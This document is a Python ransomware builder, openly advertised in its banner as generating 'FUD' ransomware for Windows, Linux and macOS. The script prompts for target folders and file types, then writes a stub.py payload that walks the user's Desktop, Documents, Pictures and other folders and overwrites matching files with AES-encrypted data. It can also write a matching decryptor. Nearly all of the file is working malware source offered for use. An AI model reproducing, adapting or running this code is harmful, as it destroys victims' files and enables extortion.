import platform
import os
import time
print("[*] Checking Requirements Module.....")
if platform.system().startswith("Linux"):
    try:
        import termcolor
    except ImportError:
        os.system("python3 -m pip install termcolor -q -q -q")
        import termcolor
    try:
        from pystyle import *
    except:
        os.system("python3 -m pip install pystyle -q -q -q")
        from pystyle import *
    try:
        import colorama
        from colorama import Fore, Back, Style
    except ImportError:
        os.system("python3 -m pip install colorama -q -q -q")
        import colorama
        from colorama import Fore, Back, Style

elif platform.system().startswith("Windows"):
    try:
        import termcolor
    except ImportError:
        os.system("python -m pip install termcolor -q -q -q")
        import termcolor
    try:
        import colorama
        from colorama import Fore, Back, Style
    except ImportError:
        os.system("python -m pip install colorama -q -q -q")
        import colorama
        from colorama import Fore, Back, Style
    try:
        from pystyle import *
    except:
        os.system("python -m pip install pystyle -q -q -q")
        from pystyle import *


colorama.deinit()
banner = Center.XCenter("""
*************************************************************************
*       ______  _    _        _  __      ____    __   __   _______       *
*      / / __ )| |  / \   ___| |/ /     / ___|_ _\ \ / / _|_   _\ \`     *
*     | ||  _ \| | / _ \ / __| ' /_____| |   | '__\ V / '_ \| |  | |     *
*    < < | |_) | |/ ___ \ (__| . \_____| |___| |   | || |_) | |   > >    *
*     | ||____/|_/_/   \_\___|_|\_\     \____|_|   |_|| .__/|_|  | |     *
*      \_\                                            |_|       /_/      *
*            GENERATE FUD RANSOMEWARE FOR WINDOWS,LINUX,MAC OS           *
*                    USE AT YOUR OWN RISK!!!                             *
*                          CODED BY: MACHINE1337                         *
**************************************************************************
                            \n\n
""")
def catc():
    try:
        if platform.system().startswith("Windows"):
            print("\033c")
            print(Colorate.Vertical(Colors.green_to_yellow, banner, 2))
            inp()
        else:
            print("\033c")
            print(Colorate.Vertical(Colors.green_to_yellow, banner, 2))
            inp()
    except KeyboardInterrupt:
        print()
        print(termcolor.colored("\n[*] You Pressed The Exit Button!", 'red'))
        quit()
def inp():
    allowed = ["Desktop", "Downloads", "Pictures", "Videos", "Documents"]
    print(termcolor.colored("""
    
                        Default Directories For Encryption:
                   Desktop, Downloads, Pictures, Videos, Documents
    """,'cyan'))
    ad = input(termcolor.colored("[*] Choose From Above Directories (press enter to encrypt all): ",'green'))
    if not ad:
        dri = allowed
    else:
        dri = ad.split(',')
        for value in dri:
            if value not in allowed:
                print(termcolor.colored("\n[+] Your Input is incorrect!!!",'red'))
                exit()
    print(termcolor.colored("""

                            Default Extension For Encryption:
                    pdf,txt,jpeg,png,vbs,py,lnk,docx,xlsx,docm,js,rar,zip,java,sh
        """, 'cyan'))
    allowt = ["java","rar","zip","pdf","sh","txt","jpeg","png","vbs","py","lnk","docx","xlsx","docm","js"]
    useput = input(termcolor.colored("[*] Choose From Above Extension To Encrypt (press enter to encrypt all): ",'green'))
    if not useput:
        values = allowt
    else:
        values = useput.split(',')
        for value in values:
            if value not in allowt:
                print(termcolor.colored("[-] Your input is incorrect",'red'))
                exit()
    print(termcolor.colored("\n[+] Generating The Encryption Key:-",'yellow'))
    key = os.urandom(32)
    iv = os.urandom(16)
    a= key.hex()
    c = bytes.fromhex(a)
    b=iv.hex()
    d = bytes.fromhex(b)
    print(termcolor.colored("\n[+] Warning! Save The Key:-",'red'))
    print(termcolor.colored(f"""
key = {c}
iv = {d}
""",'blue'))

    print(termcolor.colored("\n[*] Generating  Ransomeware Now:-",'cyan'))
    time.sleep(2)
    with open('stub.py','w') as f:
        f.write(f"""
import os
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.padding import PKCS7
import os.path
dories = {dri}
extension_list = {values}
result = []
for tory in dories:
    path = os.path.join(os.path.expanduser('~'), tory)
    for d, subdirs, files in os.walk(path):
        for extension in extension_list:
            extension_found = False
            for file_name in files:
                full_path = os.path.join(d, file_name)
                ext = full_path.split(".")[-1]
                if ext == extension:
                    extension_found = True
                    result.append(full_path)
            if extension_found:
                break
def aocopaEaoc():
    key = {c} 
    iv =  {d}
    for file_path in result:
        with open(file_path, "rb") as f:
            plaintext = f.read()
        padder = PKCS7(algorithms.AES.block_size).padder()
        padded_plaintext = padder.update(plaintext) + padder.finalize()
        encryptor = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend()).encryptor()
        ciphertext = encryptor.update(padded_plaintext) + encryptor.finalize()
        with open(file_path, "wb") as f:
            f.write(ciphertext)
            f.close()
    return (key, iv, ciphertext)
encryption_output = aocopaEaoc()
""")
        print(termcolor.colored("\n[*] Ransomeware File Saved As:- stub.py",'yellow'))
        ch = input(termcolor.colored("[*] Do U Want To Generate Decryptor (y/n): ",'green'))
        if ch == "y" or ch == "Y" or ch == "yes" or ch == "Yes":
            with open('decryptor.py','w') as f:
                f.write(f"""
import os.path
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.padding import PKCS7
ies = {dri}
extension_list = {values}
result = []
for ory in ies:
    path = os.path.join(os.path.expanduser('~'), ory)
    for d, subdirs, files in os.walk(path):
        for extension in extension_list:
            extension_found = False
            for file_name in files:
                full_path = os.path.join(d, file_name)
                ext = full_path.split(".")[-1]
                if ext == extension:
                    extension_found = True
                    result.append(full_path)
            if extension_found:
                break
aocpeaC = {c}
aocpead = {d}
def copeaEaocv(aocpeaC, aocpead, aocpean):
    for file_path in result:
        with open(file_path, "rb") as f:
            aocpean = f.read()
        decryptor = Cipher(algorithms.AES(aocpeaC), modes.CBC(aocpead), backend=default_backend()).decryptor()
        padded_plaintext = decryptor.update(aocpean) + decryptor.finalize()
        unpadder = PKCS7(algorithms.AES.block_size).unpadder()
        plaintext = unpadder.update(padded_plaintext) + unpadder.finalize()
        with open(file_path, "wb") as f:
            f.write(plaintext)
            f.close()
    return plaintext
aocpean = file_name
decrypted_output = copeaEaocv(aocpeaC, aocpead, aocpean)
                """)
                time.sleep(2)
                print(termcolor.colored("\n[*] Decryptor Saved As decryptor.py",'yellow'))
        elif ch == "n" or ch == "N" or ch == "No" or ch == "no":
            print(termcolor.colored("[*] As u Wish!!! But Save The Key",'red'))
catc()

#coded by machine1337! Don't copy the code without giving me credit.
